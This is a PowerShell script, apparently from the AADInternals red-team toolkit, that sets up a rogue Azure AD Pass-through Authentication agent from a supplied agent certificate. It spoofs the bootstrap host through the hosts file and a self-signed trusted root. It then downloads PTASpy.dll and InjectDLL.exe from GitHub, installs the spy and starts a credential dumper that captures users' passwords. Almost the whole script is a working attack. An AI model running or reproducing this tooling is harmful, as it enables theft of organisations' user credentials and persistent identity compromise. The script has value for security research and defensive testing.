<#
    .SYNOPSIS
    This script configures the Windows server to use the provided PTA agent certificate and optional bootstrap.xml

    .DESCRIPTION
    This script configures the Windows server to use the provided PTA agent certificate and optional bootstrap.xml.
    Installs:
    * vc_redist.x64.exe
    * PTA agent
    * PTA Spy
    * Other required scripts

    If bootstrap is provided:
    * Set's .hosts file to point <tenantid>.pta.bootstrap.his.msappproxy.net to 127.0.0.1
    * Creates a certificate for <tenantid>.pta.bootstrap.his.msappproxy.net
    * Binds <tenantid>.pta.bootstrap.his.msappproxy.net to 0.0.0.0:443
    * Starts a http server to return bootstrap.xml

    .PARAMETER Certificate
    Path to PTA agent certificate (.pfx)

    .PARAMETER Boostrap
    Path to PTA agent bootstrap (.xml)

    .PARAMETER StartService
    If true, will automatically start PTASpy after configuration.

    .Example
    .\Configure-PTASpy.ps1 -Certificate .\cert.pfx -Bootstrap .\bootstrap.xml

    .Example
    .\Configure-PTASpy.ps1 -Certificate .\cert.pfx -Bootstrap .\bootstrap.xml -StartService $False

    .NOTES
    Version: 1.3
    Author:  @DrAzureAD (Dr Nestori Syynimaa)
    Date:    Sep 20 2022
#>
[cmdletbinding()]
Param(
    [Parameter(Mandatory=$True)]
    [String]$Certificate,
    [Parameter(Mandatory=$False)]
    [String]$Bootstrap,
    [Parameter(Mandatory=$False)]
    [bool]$StartService=$True
)

# Check that the certificate exists
if(-not (Test-Path $Certificate))
{
    Write-Host "Certificate doesn't exist: $Certificate" -ForegroundColor Red
    return
}

# Set the Tls
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"

# Import the certificate twice, otherwise PTAAgent has issues to access private keys
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new((Get-Item $Certificate).FullName, $null, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::MachineKeySet -bor [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet -bor [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
$cert.Import((Get-Item $Certificate).FullName, $null, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::MachineKeySet -bor [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet -bor [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)

# Get the Tenant Id and Instance Id
$TenantId = $cert.Subject.Split("=")[1]

foreach($extension in $cert.Extensions)
{
    if($extension.Oid.Value -eq "1.3.6.1.4.1.311.82.1")
    {
        $InstanceID = [guid]$extension.RawData
        break
    }
}

# Download other scripts
Write-Verbose "* Downloading Start-HttpServer.ps1"
wget -uri "https://github.com/Gerenios/public/raw/master/PTASpy/Start-HttpServer.ps1" -OutFile .\Start-HttpServer.ps1
Write-Verbose "* Downloading Install-PTASpy.ps1"
wget -uri "https://github.com/Gerenios/public/raw/master/PTASpy/Install-PTASpy.ps1" -OutFile .\Install-PTASpy.ps1
Write-Verbose "* Downloading Dump-Credentials.ps1"
wget -uri "https://github.com/Gerenios/public/raw/master/PTASpy/Dump-Credentials.ps1" -OutFile .\Dump-Credentials.ps1


# Download VC++ redists
Write-Verbose "* Downloading Microsoft Visual C++ 2015 Redistributable (x64)"
wget -uri "https://download.microsoft.com/download/6/A/A/6AA4EDFF-645B-48C5-81CC-ED5963AEAD48/vc_redist.x64.exe" -OutFile .\vc_redist.x64.exe

# Install the VC++ redists
Write-Verbose "* Installing vc_redist.x64.exe"
Start-Process ".\vc_redist.x64.exe" -ArgumentList "/passive"  -Wait

# Download the PTA agent
Write-Verbose "* Downloading PTA agent (AADConnectAuthAgentSetup.exe)"
wget -Uri "https://download.msappproxy.net/Subscription/00000000-0000-0000-0000-000000000000/Connector/ptaDownloadConnectorInstaller" -OutFile .\AADConnectAuthAgentSetup.exe

# Download WiX package manager
Write-Verbose "* Downloading WiX package manager and expanding to .\wix"
wget -Uri "https://github.com/wixtoolset/wix3/releases/download/wix3104rtm/wix310-binaries.zip" -OutFile .\wix.zip
Expand-Archive -Path .\wix.zip -DestinationPath .\wix

# Extract PTAAgent package
Write-Verbose "* Extracting AADConnectAuthAgentSetup.exe package to .\AADConnectAuthAgentSetup"
Start-Process ".\wix\dark.exe" -ArgumentList "AADConnectAuthAgentSetup.exe", "-x AADConnectAuthAgentSetup" -Wait

# Install the PTA agent
Write-Verbose "* Installing PTA Agent"
Start-Process "$env:windir\System32\msiexec.exe" -ArgumentList "/package AADConnectAuthAgentSetup\AttachedContainer\PassThroughAuthenticationInstaller.msi","/passive"  -Wait

# Set the registry value (the registy entry should already exists)
Write-Verbose "Setting HKLM:\SOFTWARE\Microsoft\Azure AD Connect Agents\Azure AD Connect Authentication Agent\InstanceID to $InstanceID"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect Agents\Azure AD Connect Authentication Agent" -Name "InstanceID" -Value $InstanceID

# Set the tenant id
Write-Verbose "Setting HKLM:\SOFTWARE\Microsoft\Azure AD Connect Agents\Azure AD Connect Authentication Agent\TenantID to $TenantId"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect Agents\Azure AD Connect Authentication Agent" -Name "TenantID" -Value $TenantId

# Set the service host
Write-Verbose "Setting HKLM:\SOFTWARE\Microsoft\Azure AD Connect Authentication Agent\ServiceHost to pta.bootstrap.his.msappproxy.net"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect Authentication Agent" -Name "ServiceHost" -Value "pta.bootstrap.his.msappproxy.net"

# Create the configuration file
$trustConfig = @"
<?xml version="1.0" encoding="utf-8"?>
<ConnectorTrustSettingsFile xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <CloudProxyTrust>
    <Thumbprint>$($cert.Thumbprint)</Thumbprint>
    <IsInUserStore>false</IsInUserStore>
  </CloudProxyTrust>
</ConnectorTrustSettingsFile>
"@
$configFile = "$env:ProgramData\Microsoft\Azure AD Connect Authentication Agent\Config\TrustSettings.xml"

Write-Verbose "* Creating Config directory"
New-Item -Path "$env:ProgramData\Microsoft\Azure AD Connect Authentication Agent\Config" -ItemType Directory -Force | Out-Null
        
Write-Verbose "Creating configuration file $configFile"
$trustConfig | Set-Content $configFile

# Add certificate to Local Computer Personal store
Write-Verbose "* Adding $($cert.Thumbprint) to Local Computer Personal Store"
$myStore = Get-Item -Path "Cert:\LocalMachine\My"
$myStore.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
$myStore.Add($cert)
$myStore.Close()

# Set the read access to private key
$ServiceUser="NT SERVICE\AzureADConnectAuthenticationAgent"

# Create an accessrule for private key
$AccessRule = New-Object Security.AccessControl.FileSystemAccessrule $ServiceUser, "read", allow
        
# Give read permissions to the private key
$keyName = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($cert).Key.UniqueName
Write-Verbose "* Private key: $keyName"

$paths = @(
    "$env:ALLUSERSPROFILE\Microsoft\Crypto\RSA\MachineKeys\$keyName"
    "$env:ALLUSERSPROFILE\Microsoft\Crypto\Keys\$keyName"
)
foreach($path in $paths)
{
    if(Test-Path $path)
    {       
        Write-Verbose "Setting read access for ($ServiceUser) to the private key ($path)"
        
        try
        {
            $permissions = Get-Acl -Path $path -ErrorAction SilentlyContinue
            $permissions.AddAccessRule($AccessRule)
            Set-Acl -Path $path -AclObject $permissions -ErrorAction SilentlyContinue
        }
        catch
        {
            Write-Error "Could not give read access for ($ServiceUser) to the private key ($path)!"
        }
    }
}

# Set the service startup type to manual
Write-Verbose "* Setting AzureADConnectAuthenticationAgent service startup type to manual"
Set-Service "AzureADConnectAuthenticationAgent" -StartupType Manual

# Create directory for PTASpy binaries
Write-Verbose "* Creating directory C:\PTASpy"
$PTASpyDir = New-Item -ItemType Directory -Force -Path C:\PTASpy | Out-Null

# Download PTASpy.dll to C:\PTASpy
Write-Verbose "* Downloading PTASpy.dll to C:\PTASpy\"
wget -Uri "https://github.com/Gerenios/AADInternals/raw/4c0a8b9b8489b9c2d27eab4e374375b07cf77987/PTASpy.dll" -OutFile "C:\PTASpy\PTASpy.dll"

# Download InjectDLL.exe to C:\PTASpy
Write-Verbose "* Downloading InjectDLL.exe to C:\PTASpy\"
wget -Uri "https://github.com/Gerenios/AADInternals/raw/4c0a8b9b8489b9c2d27eab4e374375b07cf77987/InjectDLL.exe" -OutFile "C:\PTASpy\InjectDLL.exe"

# Clean up
Write-Verbose "* Cleaning up"
Remove-Item .\AADConnectAuthAgentSetup -Recurse -Force
Remove-Item .\AADConnectAuthAgentSetup.exe -Force
Remove-Item .\wix -Recurse -Force
Remove-Item .\wix.zip -Force
Remove-Item .\vc_redist.x64.exe -Force

Write-Host "PTA Agent successfully configured,`n"

# If boostrap is provided, configure certificate and start http server
if($Bootstrap)
{
    # Check that the bootstrap exists 
    if(-not (Test-Path $Bootstrap))
    {
        Write-Host "Bootstrap doesn't exist: $Bootstrap" -ForegroundColor Red
        return
    }

    Write-Verbose "* Bootstrap provided, configuring SSL certificate for $($TenantId).pta.bootstrap.his.msappproxy.net"

    # Generate certificate
    Write-Verbose "* Generating SSL certificate"
    $sslCert = New-SelfSignedCertificate -Subject "CN=$($TenantId).pta.bootstrap.his.msappproxy.net" -DnsName "$($TenantId).pta.bootstrap.his.msappproxy.net" -HashAlgorithm 'SHA256' -Provider "Microsoft Strong Cryptographic Provider" -NotAfter (Get-Date).AddYears(10)

    # Add certificate to trusted root certificate authorities
    Write-Verbose "* Add the SSL certificate ($($sslCert.Thumbprint)) to Trusted Root Certificate Authorities"
    $rootStore = Get-Item -Path "Cert:\LocalMachine\Root"
    $rootStore.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
    $rootStore.Add($sslCert)
    $rootStore.Close()

    # Set the .hosts file
    Write-Verbose "* Add bootstrap FQDN ($($TenantId).pta.bootstrap.his.msappproxy.net) to .hosts file to point to 127.0.0.1"
    Add-Content -Path "$($env:windir)\System32\drivers\etc\hosts" -Value "`n# Bootstrap `n 127.0.0.1 `t $($TenantId).pta.bootstrap.his.msappproxy.net"

    if($StartService)
    {
        # Start the http server
        Write-Verbose "* Starting the http server"
        Start-Process "powershell" -ArgumentList ".\Start-HttpServer.ps1","-FileToServe","$Bootstrap","-ContentType","text/xml","-Thumbprint",$sslCert.Thumbprint,"-Verbose"

        # Wait for 5 seconds
        Write-Verbose "* Waiting for five seconds for http server to start"
        Start-Sleep -Seconds 5
    }
    
    # Print instructions to start http server
    Write-Host "To start http server (in another PowerShell session):"
    Write-Host ".\Start-HttpServer.ps1 -FileToServe `"$Bootstrap`" -ContentType `"text/xml`" -Thumbprint `"$($sslCert.Thumbprint)`" -Verbose`n"
}


if($StartService)
{
    # Install PTA Spy
    Write-Verbose "* Installing PTASpy"
    Start-Process "powershell" -ArgumentList ".\Install-PTASpy.ps1" -Wait

    # Start credentials dumper
    Write-Verbose "* Starting credentials dumper"
    Start-Process "powershell" -ArgumentList ".\Dump-Credentials.ps1"
}

# Print instructions
Write-Host "To install PTA agent:"
Write-Host ".\Install-PTASpy`n"

Write-Host "To start credentials dump:"
Write-Host ".\Dump-Credentials"
